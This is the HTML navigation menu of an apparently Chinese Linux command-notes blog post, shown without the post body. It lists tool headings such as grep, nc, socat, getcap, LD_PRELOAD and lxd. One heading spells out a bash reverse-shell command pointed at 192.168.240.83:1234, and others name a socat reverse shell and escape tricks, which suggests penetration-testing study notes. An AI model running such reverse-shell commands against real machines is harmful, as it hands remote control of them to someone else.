href="#%E2%80%93"><span class="nav-text">–</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pts"><span class="nav-text">pts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#docker"><span class="nav-text">docker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wc"><span class="nav-text">wc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-7"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sulogin"><span class="nav-text">sulogin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cron%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-text">cron定时任务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lxd"><span class="nav-text">lxd</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AC%94%E8%AE%B0"><span class="nav-text">Linux 常用指令笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#awk-%E6%96%87%E6%9C%AC%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7"><span class="nav-text">&#x3D;&#x3D;awk&#x3D;&#x3D; 文本处理工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E5%8F%98%E9%87%8F"><span class="nav-text">核心变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-text">示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#knockd-%E6%9C%8D%E5%8A%A1"><span class="nav-text">knockd 服务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%9A-etc-knockd-conf"><span class="nav-text">配置文件：&#x2F;etc&#x2F;knockd.conf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%9F%E8%83%BD%EF%BC%9A"><span class="nav-text">功能：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="nav-text">应用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#grep-%E6%96%87%E6%9C%AC%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7"><span class="nav-text">grep 文本搜索工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%83%E5%AD%97%E7%AC%A6%E8%A1%A8"><span class="nav-text">元字符表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-1"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nc-Netcat-%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7"><span class="nav-text">nc (Netcat) 网络工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-2"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-1"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sudo-%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86"><span class="nav-text">sudo 权限管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B8%E5%9E%8B%E9%85%8D%E7%BD%AE"><span class="nav-text">典型配置</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#drush-Drupal-Shell"><span class="nav-text">drush (Drupal Shell)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#scp-%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="nav-text">scp 安全文件传输</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-2"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ps"><span class="nav-text">ps</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-3"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apache2"><span class="nav-text">apache2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tac"><span class="nav-text">tac</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#var-mail"><span class="nav-text">&#x2F;var&#x2F;mail</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#etc-release"><span class="nav-text">&#x2F;etc&#x2F;release</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tar"><span class="nav-text">tar</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-4"><span class="nav-text">常用参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-3"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#find"><span class="nav-text">find</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E5%92%8C%E7%A4%BA%E4%BE%8B"><span class="nav-text">常用参数和示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%93break-system-packages"><span class="nav-text">–break-system-packages</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exiftool"><span class="nav-text">exiftool</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-5"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#curl"><span class="nav-text">curl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tldr"><span class="nav-text">tldr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gocr"><span class="nav-text">gocr</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#doas"><span class="nav-text">doas</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-4"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dig"><span class="nav-text">dig</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-5"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#resolv-conf"><span class="nav-text">resolv.conf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#etc-bind"><span class="nav-text">&#x2F;etc&#x2F;bind</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tr"><span class="nav-text">tr</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-6"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sed"><span class="nav-text">sed</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B-7"><span class="nav-text">使用示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#alias"><span class="nav-text">alias</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#openssl"><span class="nav-text">openssl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xargs"><span class="nav-text">xargs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#id-rsa"><span class="nav-text">id_rsa</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh-authorized-keys"><span class="nav-text">~&#x2F;.ssh&#x2F;authorized_keys</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%9C%E7%94%A8"><span class="nav-text">作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E7%A7%81%E9%92%A5%E7%94%9F%E6%88%90%E5%85%AC%E9%92%A5"><span class="nav-text">用私钥生成公钥</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#smb"><span class="nav-text">smb</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Samba-%E7%AE%80%E4%BB%8B"><span class="nav-text">Samba 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E5%8A%9F%E8%83%BD"><span class="nav-text">主要功能</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E8%A6%81%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="nav-text">主要配置文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smbclient-%E5%8F%82%E6%95%B0%E5%92%8C%E4%BD%BF%E7%94%A8"><span class="nav-text">smbclient 参数和使用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ftp"><span class="nav-text">ftp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E4%BA%A4%E4%BA%92%E5%91%BD%E4%BB%A4%EF%BC%88%E7%99%BB%E5%BD%95%E5%90%8E%E4%BD%BF%E7%94%A8%EF%BC%89"><span class="nav-text">常用交互命令（登录后使用）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getcap"><span class="nav-text">getcap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%83%BD%E5%8A%9B%EF%BC%88Capabilities%EF%BC%89%E7%A4%BA%E4%BE%8B"><span class="nav-text">能力（Capabilities）示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ln"><span class="nav-text">ln</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-6"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bash-i-dev-tcp-ip-1234-0-1"><span class="nav-text">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;1234 0&gt;&amp;1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bash-i"><span class="nav-text">bash -i</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dev-tcp-192-168-240-83-1234"><span class="nav-text">&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.240.83&#x2F;1234</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0-1"><span class="nav-text">0&gt;&amp;1</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#stty-raw-echo-fg-%E7%BE%8E%E5%8C%96%E7%BB%88%E7%AB%AF"><span class="nav-text">stty raw -echo; fg (美化终端)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%93"><span class="nav-text">–</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pts"><span class="nav-text">pts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#docker"><span class="nav-text">docker</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wc"><span class="nav-text">wc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0-7"><span class="nav-text">常用参数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sulogin"><span class="nav-text">sulogin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cron%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-text">cron定时任务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lxd"><span class="nav-text">lxd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#socat%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-text">socat端口转发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%88%E5%B0%86%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%E5%88%B0%E8%BF%9C%E7%A8%8B%EF%BC%89"><span class="nav-text">本地端口转发（将本地端口流量转发到远程）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%88%E5%B0%86%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E7%9A%84%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%E5%88%B0%E6%9C%AC%E5%9C%B0%EF%BC%89"><span class="nav-text">远程端口转发（将远程端口的流量转发到本地）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%88%E5%B0%86%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E7%9A%84%E8%AF%B7%E6%B1%82%E8%BD%AC%E5%8F%91%E5%88%B0%E5%8F%A6%E4%B8%80%E4%B8%AA%E8%BF%9C%E7%A8%8B%E5%9C%B0%E5%9D%80%EF%BC%89"><span class="nav-text">反向代理（将访问远程端口的请求转发到另一个远程地址）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UDP%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-text">UDP端口转发</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%90%91-Shell%EF%BC%88%E7%9B%91%E5%90%AC%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%8F%8D%E8%BF%9E%EF%BC%89"><span class="nav-text">反向 Shell（监听远程主机的反连）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#netstat-lntup"><span class="nav-text">netstat -lntup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E6%95%B0%E8%A7%A3%E6%9E%90"><span class="nav-text">参数解析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ss"><span class="nav-text">ss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%F0%9F%94%B9-%E5%B8%B8%E8%A7%81%E9%80%89%E9%A1%B9"><span class="nav-text">🔹 常见选项</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shansum"><span class="nav-text">shansum</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95"><span class="nav-text">基本用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9"><span class="nav-text">常用选项</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nl"><span class="nav-text">nl</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%A0%BC%E5%BC%8F%EF%BC%9A"><span class="nav-text">命令格式：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%EF%BC%9A"><span class="nav-text">命令参数：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shell%E5%BC%95%E5%8F%B7"><span class="nav-text">shell引号</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E8%A7%A3%EF%BC%9A"><span class="nav-text">分解：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ssh-authorized-keys-1"><span class="nav-text">~&#x2F;.ssh&#x2F;authorized_keys</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%9C%E7%94%A8-1"><span class="nav-text">作用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E7%A7%81%E9%92%A5%E7%94%9F%E6%88%90%E5%85%AC%E9%92%A5-1"><span class="nav-text">用私钥生成公钥</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%83%E9%80%B8"><span class="nav-text">&#x2F;*逃逸</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tee"><span class="nav-text">tee</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E9%80%89%E9%A1%B9%EF%BC%9A"><span class="nav-text">常见选项：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#man"><span class="nav-text">man</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#man-%E5%91%BD%E4%BB%A4%E7%9A%84%E5%B8%B8%E7%94%A8%E9%80%89%E9%A1%B9"><span class="nav-text">man 命令的常用选项</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text">$(())</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#usr-lib"><span class="nav-text">&#x2F;usr&#x2F;lib</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E5%85%B1%E4%BA%AB%E5%BA%93%EF%BC%88Shared-Libraries%EF%BC%89"><span class="nav-text">1. 共享库（Shared Libraries）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E4%BE%9D%E8%B5%96%E5%BA%93%EF%BC%88Dependency-Libraries%EF%BC%89"><span class="nav-text">2. 依赖库（Dependency Libraries）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E6%8F%92%E4%BB%B6%EF%BC%88Plugins%EF%BC%89"><span class="nav-text">3. 插件（Plugins）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-32-%E4%BD%8D%E4%B8%8E-64-%E4%BD%8D%E5%BA%93"><span class="nav-text">4. 32 位与 64 位库</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lynx"><span class="nav-text">lynx</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LD-PRELOAD"><span class="nav-text">LD_PRELOAD</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#etc-ld-so-preload"><span class="nav-text">&#x2F;etc&#x2F;ld.so.preload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#telnet"><span class="nav-text">telnet</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E6%B3%95"><span class="nav-text">用法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#strace"><span class="nav-text">strace</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#strace-%E8%B7%9F%E8%B8%AA%E6%B5%81%E7%9A%84%E8%BE%93%E5%87%BA%E5%86%85%E5%AE%B9"><span class="nav-text">strace 跟踪流的输出内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#grep-Pi-open-access-no-such-file-%E7%9A%84%E8%BF%87%E6%BB%A4%E9%80%BB%E8%BE%91"><span class="nav-text">grep -Pi &quot;open|access|no such file&quot; 的过滤逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD"><span class="nav-text">核心功能</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#umask"><span class="nav-text">umask</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%AD%E6%B3%95"><span class="nav-text">语法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bash"><span class="nav-text">bash</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Bash-%E8%84%9A%E6%9C%AC%E4%B8%AD%E7%9A%84%E4%BD%8D%E7%BD%AE%E5%8F%82%E6%95%B0"><span class="nav-text">Bash 脚本中的位置参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%A4%E4%BA%92%E6%A8%A1%E5%BC%8F%E5%92%8C%E8%84%9A%E6%9C%AC%E6%A8%A1%E5%BC%8F"><span class="nav-text">交互模式和脚本模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E4%B8%8E%E5%AE%89%E5%85%A8"><span class="nav-text">权限与安全</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xxd"><span class="nav-text">xxd</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xxd-%E5%91%BD%E4%BB%A4%E9%80%89%E9%A1%B9"><span class="nav-text">xxd 命令选项</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
